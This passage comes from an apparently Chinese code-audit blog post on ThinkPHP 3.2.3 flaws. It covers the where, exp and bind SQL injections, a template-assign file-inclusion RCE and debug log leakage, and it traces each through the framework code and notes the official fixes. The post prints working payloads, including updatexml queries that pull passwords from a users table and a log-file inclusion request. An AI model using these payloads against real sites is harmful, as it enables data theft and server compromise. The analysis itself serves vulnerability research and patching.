<span class="keyword">and</span> <span class="number">1</span>=<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select password <span class="keyword">from</span> users limit <span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009721.png" alt="在这里插入图片描述"></p><p>先放出Payload，下面跟着代码看是怎么出现的这个<code>where</code> 报错注入，这次传入的参数为数组 <code>?id[where]= 1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23</code> ，<code>I</code>方法在最后的代码会对数组参数的每个成员使用<code>think_filter</code>函数 </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009867.png" alt="在这里插入图片描述"></p><p>刚才跟着正常的SQL测试语句知道，知道<code>think_filter</code>函数是一个黑名单，过滤了一些特殊字符，但明显过滤的不是很全，<code>updatexml、extractvalue</code> 这些报错函数都未过滤</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009039.png" alt="在这里插入图片描述"></p><p>继续跟进便进入了<code>find</code>函数到<code>_parseOptions</code> 这个函数中，在进入此函数前<code>$options</code>是</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009319.png" alt="在这里插入图片描述"></p><p>刚才正常传入的SQL测试语句只有进入到<code>_parseType()</code>后才会被<code>intval</code> 函数给强制转换，但这里这个if判断中的<code>is_array($options[&#39;where&#39;])</code>没有满足，此时的where的值不是数组</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009897.png" alt="在这里插入图片描述"></p><p>和上面正常传入的SQL测试语句对比一下，便会发现不同，最后通过此函数处理后传入的payload依旧没有变</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009594.png" alt="在这里插入图片描述"></p><p>F7继续跟进</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009656.png" alt="在这里插入图片描述"></p><p>到<code>select</code>函数后，发现<code>buildSelectSql</code> 的作用是拼接SQL语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009913.png" alt="在这里插入图片描述"></p><p>跟进这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009819.png" alt="在这里插入图片描述"></p><p>第一个<code>if</code>语句就是计算<code>limit</code>，这里不是重点，发现后面又调用了<code>parseSql</code> 这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009357.png" alt="在这里插入图片描述"></p><p>构造的参数是在<code>where</code> ，跟进看一下</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009408.png" alt="在这里插入图片描述"></p><p>此时的<code>$whereStr</code> 是字符串，所以就没有经过中间的代码，直接返回此语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009515.png" alt="在这里插入图片描述"></p><p>F7跟进就会发现最终拼接的语句便还是我们传入的，并没有被过滤掉，便导致了thinkphp3.2.3 where注入</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009669.png" alt="在这里插入图片描述"></p><p><strong>官方修补方法：</strong></p><p>@<a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009777.png" alt="在这里插入图片描述"></p><p><code>v3.2.4</code>将<code>$options</code>和<code>$this-&gt;options</code>进行了区分，从而传入的参数无法污染到<code>$this-&gt;options</code>，也就无法控制sql语句了</p><h3 id="Thinkphp3-2-3-exp注入"><a href="#Thinkphp3-2-3-exp注入" class="headerlink" title="Thinkphp3.2.3 exp注入"></a>Thinkphp3.2.3 exp注入</h3><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]==<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009670.png" alt="在这里插入图片描述"></p><p>把环境重新更改一下，使用全局数组进行传参，这里之所以不用<code>I</code>函数来获取参数，是因为<code>I</code>函数会回调<code>think_filter()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了EXP字符串，并会在后面拼接一个空格，这个点会影响exp注入，到后面便能了解了，打上断点，先进入<code>where</code>函数中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009605.png" alt="在这里插入图片描述"></p><p>只有最后的代码对传入的参数发挥了作用,其作用便是把数组<code>array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;])</code> 传给<code>$this-&gt;options[&#39;where&#39;]</code> ，继续跟进到<code>find</code>函数，一直到<code>parseWhere()</code> 函数，观察到这一步和上面的where注入有哪些区别</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009763.png" alt="在这里插入图片描述"></p><p>传入的参数会进入到<code>parseWhereItem()</code> 函数中，而where注入的是当作字符串直接跳过了这一段代码，先判断该变量是否为数组，再判断索引为0的值是否为字符串，到下面的代码还要验证该索引值是否等于<code>exp</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009900.png" alt="在这里插入图片描述"></p><p>关键点在于下面的代码：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009166.png" alt="在这里插入图片描述"></p><p>正常来说传入的参数是字符串即<code>$val=test</code>，但这里传入了数组，<code>$exp</code> 便是<code>$val[0]</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009323.png" alt="在这里插入图片描述"></p><p>又满足了<code>elseif</code>语句（跟到这里便也能理解为什么要用超全局数组，而不用I函数了，如果使用I函数不满足条件，便会异常抛出，从而影响注入），把<code>where</code>条件直接用点拼接，这时传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]==<span class="number">1</span> <span class="keyword">and</span> test</span><br></pre></td></tr></table></figure><p>便会造成SQL注入，最终拼接出来的语句便是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where `username`  <span class="variable">$val</span>[<span class="number">1</span>]  limit <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009577.png" alt="在这里插入图片描述"></p><h3 id="thinkphp3-2-3-bind注入"><a href="#thinkphp3-2-3-bind注入" class="headerlink" title="thinkphp3.2.3 bind注入"></a>thinkphp3.2.3 bind注入</h3><blockquote><p><strong>简述</strong>：由于框架实现安全数据库过程中在<code>update</code>更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入</p></blockquote><p>将环境更改一下</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009554.png" alt="在这里插入图片描述"></p><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>传入参数，跟进一下代码，看一下为什么这样的<code>payload</code>能造成报错注入，跟前面几条链一样，参数会先赋值给<code>$this-&gt;options[&#39;where&#39;]</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009037.png" alt="在这里插入图片描述"></p><p>再跟进到<code>save</code>方法中去，调用<code>_parseOptions</code> 方法</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009642.png" alt="在这里插入图片描述"></p><p>到这一步<code>$val</code> 为数组，不属于标量，所以不经过<code>_parseType</code>方法验证类型</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010811.png" alt="在这里插入图片描述"></p><p>从该方法中出来后<code>$this-&gt;options</code>赋值给 <code>$options</code> ，接下来便调用<code>$this-&gt;db-&gt;update</code>方法</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010861.png" alt="在这里插入图片描述"></p><p>在这里出现一段SQL语句和参数绑定，跟进<code>parseSet</code>这个方法查看</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010113.png" alt="在这里插入图片描述"></p><p>再跟进到<code>$this-&gt;bindParam($name,$val);</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010614.png" alt="在这里插入图片描述"></p><p>因为<code>$this-&gt;bind</code>为空，所以<code>$name</code>为0，而<code>$val</code>为1</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010551.png" alt="在这里插入图片描述"></p><p>经过此方法的处理,SQL语句便存在一个<code>:</code> 阻断了注入，最终绑定参数为：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010565.png" alt="在这里插入图片描述"></p><p>产生的SQL语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `users` SET `password`=:<span class="number">0</span></span><br></pre></td></tr></table></figure><p>再调用<code>parseWhereItem</code>方法拼接<code>where</code>部分处理后的语句，当<code>$exp</code>为bind时，<code>$whereStr</code>部分可控</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010810.png" alt="在这里插入图片描述"></p><p>两段SQL语句再进行合并，最终形成的SQL语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `users` SET `password`=:<span class="number">0</span> WHERE `id` = :<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>最后跟进<code>execute</code>方法，该方法中有对绑定参数的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind))&#123;</span><br><span class="line">   <span class="variable">$that</span>   =   <span class="variable language_">$this</span>;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;queryStr =   <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr,<span class="title function_ invoke__">array_map</span>(function(<span class="variable">$val</span>) <span class="keyword">use</span>(<span class="variable">$that</span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这两行代码便是起到替换的作用，代码先是创建一个<a href="https://www.cnblogs.com/echojson/p/10957362.html">闭包</a>，调用<code>array_map</code>，对<code>$this-&gt;bind</code>这个数组中的每个参数都调用这个闭包，对<code>$this-&gt;bind</code>进行处理，未处理前为<code>array(&quot;:0&quot;=&gt;&quot;1&quot;);</code> ，处理后为：<code>array(&quot;:0&quot;=&gt;&quot;&#39;1&#39;&quot;);</code> ，最后再通过<code>strtr</code>函数处理<code>$this-&gt;queryStr</code>语句，得到的结果如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010385.png" alt="在这里插入图片描述"></p><p><code>:0</code>替换为外部传进来的字符串，所以将传入参数等于0，这样就拼接了一个<code>:0</code>，然后会通过<code>strtr()</code>被替换为1，SQL语句便可以正常执行，这也就是为什么payload中<code>id[1]=0</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010797.png" alt="在这里插入图片描述"></p><p><strong>官方修复：</strong></p><p>过滤<code>bind</code>即可</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010258.png" alt="在这里插入图片描述"></p><h2 id="TP3-2-3-RCE漏洞"><a href="#TP3-2-3-RCE漏洞" class="headerlink" title="TP3.2.3 RCE漏洞"></a>TP3.2.3 RCE漏洞</h2><blockquote><p>业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码</p></blockquote><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010066.png" alt="在这里插入图片描述"></p><p>程序会进入模板渲染方法中，需要先创建对应的模板文件（<code>View</code>），模板文件位置为：<code>\Application\Home\View\Index\index.html</code> ，这里的模板渲染方法除了<code>display</code>，也可以为<code>fetch、show</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010959.png" alt="在这里插入图片描述"></p><p>但使用<code>fetch</code>会有一些区别，如上图其程序逻辑会使用到<code>ob_start()</code>打开缓冲区，所以PHP代码的数据块和<code>echo()</code>输出都会进入缓冲区而不会立刻输出，如果想要<code>fetch</code>方法对应的攻击代码输出的话，需要在攻击代码末尾带上<code>exit()</code>或<code>die()</code></p><p>Debug开启和关闭是有一些区别的，具体如下：</p><p><strong>Log记录目录：</strong></p><p>若开启debug模式日志会到：<code>\Application\Runtime\Logs\Home\</code>下</p><p>若未开启debug模式日志会到：<code>\Application\Runtime\Logs\Common\</code>下</p><p><strong>这里以Debug关闭为例（</strong><code>define(&#39;APP_DEBUG&#39;,false)</code><strong>）</strong></p><p><strong>构造请求包：</strong></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010316.png" alt="在这里插入图片描述"></p><p><strong>构造攻击请求：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/<span class="number">22_08_03</span>.log</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010855.png" alt="在这里插入图片描述"></p><p>若<code>Debug</code>开启，正确的请求日志也会被记录到日志中，只是日志路径不 一样了而已</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010429.png" alt="在这里插入图片描述"></p><p>下面跟着代码来走一遍，看看此payload如何触发文件包含导致RCE</p><p>先传入参数会先进入<code>assign</code>函数中，再赋值给<code>$this→tVar</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010989.png" alt="在这里插入图片描述"></p><p>之后会进入到<code>display</code>方法中，<code>display</code>方法开始解析并获取模板文件内容，此时模板文件路径和内容为空</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010591.png" alt="在这里插入图片描述"></p><p>再进入到<code>fetch</code>方法中，此时传入的参数为空，程序会根据配置去获取默认模板文件的位置</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010364.png" alt="在这里插入图片描述"></p><p>当<code>TMPL_ENGINE_TYPE</code> 配置为<code>php</code>时，会采用PHP原生模板，默认的为<code>Think</code> ,便进入到else分支中，获取<code>$this→tVar</code>变量值赋值给<code>$params</code>，之后再进入到<code>Hook::listen</code>方法中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010760.png" alt="请添加图片描述"></p><p>进入<code>exec</code>方法中，处理后调用<code>Behavior\ParseTemplateBehavior</code>类中的run方法处理<code>$params</code>这个带有日志文件路径的值</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010491.png" alt="请添加图片描述"></p><p>程序进入run方法中，一系列判断后，进入else分支，调用Think\Template类中的fetch方法对变量$_data（带有日志文件路径的变量值）进行处理</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010091.png" alt="请添加图片描述"></p><p>进入Think\Template类中的fetch方法，获取缓存文件路径后，再进入Storage的load方法中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010551.png" alt="在这里插入图片描述"></p><p><code>$_filename</code>为之前获取的缓存文件路径，$var则为之前带有_filename=日志文件路径的数组，$vars不为空则使用extract方法的<code>EXTR_OVERWRITE</code>默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含，最终导致包含文件造成RCE</p><h2 id="Thinkphp3-2-3-日志泄露"><a href="#Thinkphp3-2-3-日志泄露" class="headerlink" title="Thinkphp3.2.3 日志泄露"></a>Thinkphp3.2.3 日志泄露</h2><blockquote><p>前提：开启了Debug</p></blockquote><p>THINKPHP3.2 结构：<code>Application/Runtime/Logs/Home/年份_月份_日期.log</code></p><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p>@<a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p>@<a href="https://blog.csdn.net/rfrder/article/details/114024426">https://blog.csdn.net/rfrder/article/details/114024426</a></p><p>@<a href="https://www.cnblogs.com/zpchcbd/p/12552185.html">https://www.cnblogs.com/zpchcbd/p/12552185.html</a></p><p>@<a href="https://paper.seebug.org/573/">https://paper.seebug.org/573/</a></p><p>@<a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a></p><p>@<a href="https://blog.csdn.net/Mruos/article/details/109802121">https://blog.csdn.net/Mruos/article/details/109802121</a></p><p>@<a href="https://blog.csdn.net/qq_33382313/article/details/51702787">https://blog.csdn.net/qq_33382313/article/details/51702787</a></p><p>@<a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
